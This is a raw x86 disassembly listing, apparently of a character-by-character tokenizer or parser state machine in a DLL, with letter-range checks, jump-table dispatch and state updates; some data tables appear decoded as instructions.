add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x1a
call sub_10079980
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_1005ada0
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_1007b320
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_1005ada0
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x15
call sub_100797e0
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10079910
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10008350
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_1005ada0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_1005ada0
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ edi + 0x94 ]
push eax
call sub_1005b7e0
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_1007b480 ]
jmp [ edx * 4 + jump_table_1007b470 ]
call sub_10079a20
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a20
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a20
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_100796a0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1007b484
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007b4c0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax - 0x9 ]
push esi
push edi
cmp ecx 0x35
ja r-xdata
cmp eax 0x41
jl r-xdata
movzx ecx [ ecx + lookup_table_1007b5a4 ]
jmp [ ecx * 4 + jump_table_1007b59c ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov edx [ ebp + 0xc ]
add edx 0x20
push edx
push r--data
call sub_10018fa0
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
neg eax
sbb eax eax
and eax 0x7
add eax 0x15
mov [ ecx ] eax
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x10
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ ecx ] 0x15
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
add ecx 0x20
push ecx
push eax
push edi
call sub_1005ada0
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x14
pop edi
mov eax 0x1
pop esi
pop ebp
retn
add eax 0x20
sub_1007b5a6
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_1007b5e0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
movzx eax [ eax + lookup_table_1007b6b4 ]
jmp [ eax * 4 + jump_table_1007b6a0 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1d
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x1f
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10079570
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ edx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007b6b9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007b700
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1c
movzx eax [ eax + lookup_table_1007b7dc ]
jmp [ eax * 4 + jump_table_1007b7c8 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1e
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x1f
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push 0x2
mov eax esi
mov [ edx ] 0x1c
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10079570
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007b7e1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007b820
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3f
ja r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x1c
movzx eax [ eax + lookup_table_1007b910 ]
jmp [ eax * 4 + jump_table_1007b8f8 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x1f
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x5
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x1c
push 0x2
mov eax esi
call sub_100791e0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10079570
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
sub_1007b916
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add al [ 0x5050505 ]
add eax 0x5050505
add eax 0x3050505
add eax 0xec8b5504
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x1c
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add esi 0x20
push esi
push edi
mov [ eax ] 0x20
call sub_10028ff0
push esi
push edi
call sub_100503f0
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x18
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007b9c0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax - 0x9 ]
push esi
push edi
cmp ecx 0x35
ja r-xdata
cmp eax 0x41
jl r-xdata
movzx ecx [ ecx + lookup_table_1007baa4 ]
jmp [ ecx * 4 + jump_table_1007ba9c ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov edx [ ebp + 0xc ]
add edx 0x20
push edx
push r--data
call sub_10018fa0
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
neg eax
sbb eax eax
and eax 0xfffffff9
add eax 0x1c
mov [ ecx ] eax
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x10
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ ecx ] 0x1c
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
add ecx 0x20
push ecx
push eax
push edi
call sub_1005ada0
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x14
pop edi
mov eax 0x1
pop esi
pop ebp
retn
add eax 0x20
sub_1007baa6
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_1007bae0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_1007bc1c ]
jmp [ eax * 4 + jump_table_1007bc00 ]
mov [ ebp + 0x10 ] esi
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edi [ ebp + 0x14 ]
push eax
mov [ ecx ] 0x0
call sub_100796a0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov [ edx ] 0x22
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0xfffd
push esi
call sub_1005ada0
add esp 0x10
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0xf
mov eax ebx
call sub_100791e0
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100797e0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0x10
mov eax ebx
call sub_100791e0
add esp 0x4
jmp r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov edx [ ebp + 0x10 ]
push edi
push edx
push ebx
call sub_1005ada0
add esp 0xc
lea ecx [ esi + 0x50 ]
push ecx
lea ebx [ esi + 0x94 ]
push ebx
call sub_10012bd0
push ebx
call sub_1005b7e0
mov ebx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebx + 0x8 ]
lea eax [ esi - 0x41 ]
mov [ edx ] 0x22
cmp eax 0x19
ja r-xdata
sub_1007bc23
push es
push es
push es
add al [ edx ]
push es
add al [ esi ]
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add al [ esi ]
add eax [ esi ]
push es
push es
push es
add eax [ esi ]
push es
push es
push es
push es
push es
push es
add al 0x6
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add eax [ ebx ]
add eax 0xcccccccc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
lea ecx [ esi - 0x41 ]
cmp ecx 0x19
ja r-xdata
movzx eax [ eax + r-xdata ]
jmp [ eax * 4 + r-xdata ]
mov edx [ ebp + 0x8 ]
mov [ ebp + 0x10 ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10079b20
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x23
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10079b20
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10079b20
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x24
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10079b20
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ ecx ] 0x0
call sub_100796a0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_100791e0
mov esi [ edi + 0x8 ]
mov edx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] edx
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x10
call sub_100791e0
add esp 0x4
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push edi
push ecx
push edx
call sub_1005ada0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea eax [ esi + 0x50 ]
push eax
lea ebx [ esi + 0x94 ]
push ebx
call sub_10012bd0
push ebx
call sub_1005b7e0
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebp + 0x10 ]
push ebx
push edx
push edi
call sub_1005ada0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push ecx
push eax
call sub_10012bd0
lea eax [ esi + 0x94 ]
push eax
call sub_1005b7e0
add esp 0xc
mov [ esi + 0x48 ] eax
sub_1007bd5c
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x0
call sub_100797e0
push 0xf
mov eax ebx
call sub_100791e0
add esp 0x4
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_1007be0c
pop es
pop es
add al [ edx ]
pop es
add al [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add al [ edi ]
add eax [ edi ]
pop es
pop es
pop es
add eax [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
add al 0x7
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add eax [ 0xffffffffcccccc06 ]
int3
sub_1007be50
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_1007bfa8 ]
jmp [ eax * 4 + jump_table_1007bf88 ]
mov [ ebp + 0x10 ] esi
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x24
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov edi [ ebp + 0x14 ]
push eax
mov [ edx ] 0x0
call sub_100796a0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x22
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0xfffd
push esi
call sub_1005ada0
add esp 0x10
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0xf
mov eax ebx
call sub_100791e0
mov edx [ ebx + 0x8 ]
add esp 0x4
mov [ edx ] 0x0
call sub_100797e0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0x10
mov eax ebx
call sub_100791e0
add esp 0x4
jmp r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x10 ]
push edi
push eax
push ebx
call sub_1005ada0
add esp 0xc
lea edx [ esi + 0x50 ]
push edx
lea ebx [ esi + 0x94 ]
push ebx
call sub_10012bd0
push ebx
call sub_1005b7e0
mov ebx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax [ ebx + 0x8 ]
lea ecx [ esi - 0x41 ]
mov [ eax ] 0x22
cmp ecx 0x19
ja r-xdata
sub_1007bfb0
pop es
pop es
add al [ edx ]
pop es
add al [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add al [ edi ]
add eax [ edi ]
pop es
pop es
pop es
add eax [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
add al 0x7
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add eax [ 0xffffffffcccccc06 ]
int3
sub_1007bff0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
push esi
inc eax
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x61
ja r-xdata
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x27
mov ebx [ edi + 0x8 ]
add ebx 0x3c
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
movzx eax [ eax + lookup_table_1007c1ac ]
jmp [ eax * 4 + jump_table_1007c188 ]
mov eax [ ebp + 0x10 ]
push ebx
push eax
push edi
call sub_1005ada0
add esp 0xc
mov esi [ edi + 0x8 ]
lea edx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push edx
push eax
call sub_10012bd0
lea eax [ esi + 0x94 ]
push eax
call sub_1005b7e0
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax edi
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x25
call sub_100793a0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax [ edx + 0x8 ]
pop edi
mov [ eax ] 0x27
pop esi
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov eax edi
mov edx [ eax + 0x8 ]
mov [ edx ] 0x26
call sub_100793a0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov esi edi
push 0x2
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x27
mov edi [ esi + 0x8 ]
mov ecx [ r--data ]
add edi 0x3c
add esp 0x4
cmp [ edi + 0x4 ] 0x0
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov ebx edi
push 0x13
mov eax ebx
call sub_100791e0
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100797e0
mov edx [ ebp + 0xc ]
pop edi
pop esi
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov esi edi
push 0x14
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ eax ] 0x0
call sub_100796a0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
push 0x15
mov eax edi
call sub_100791e0
add esp 0x4
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x10 ]
push edi
push eax
push esi
call sub_1005ada0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ esi + 0x8 ]
lea edx [ ebx + 0x50 ]
lea eax [ ebx + 0x94 ]
push edx
push eax
call sub_10012bd0
lea eax [ ebx + 0x94 ]
push eax
call sub_1005b7e0
add esp 0xc
mov [ ebx + 0x48 ] eax
sub_1007c1b5
or [ edx ] al
add cl [ eax ]
add cl [ eax ]
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
add cl [ eax ]
add ecx [ eax ]
or [ eax ] cl
add al 0x5
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
push es
push es
pop es
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ esi ] al
int3
sub_1007c210
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
cmp eax 0x27
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x3c
push edx
push ecx
push eax
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop ebp
retn
movzx eax [ eax + lookup_table_1007c2f0 ]
jmp [ eax * 4 + jump_table_1007c2dc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x29
mov eax 0x2
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x6c ] ecx
mov ecx [ edx + 0x8 ]
mov [ ecx ] 0x28
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x3c
push edx
push eax
push esi
call sub_1005ada0
add esp 0x10
pop esi
mov eax 0x2
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push 0x11
mov eax ebx
call sub_100791e0
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100797e0
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
pop ebx
mov eax 0x2
pop ebp
retn
sub_1007c2f5
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x3
int3
sub_1007c320
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
cmp eax 0x28
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x3c
push edx
push ecx
push eax
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop ebp
retn
movzx eax [ eax + lookup_table_1007c400 ]
jmp [ eax * 4 + jump_table_1007c3ec ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x29
mov eax 0x2
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x6c ] ecx
mov ecx [ edx + 0x8 ]
mov [ ecx ] 0x28
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x3c
push edx
push eax
push esi
call sub_1005ada0
add esp 0x10
pop esi
mov eax 0x2
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push 0x12
mov eax ebx
call sub_100791e0
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_100797e0
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
pop ebx
mov eax 0x2
pop ebp
retn
sub_1007c405
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ ebx ]
int3
sub_1007c430
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
inc eax
push esi
push edi
cmp eax 0x61
ja r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
movzx eax [ eax + lookup_table_1007c5b4 ]
jmp [ eax * 4 + jump_table_1007c598 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
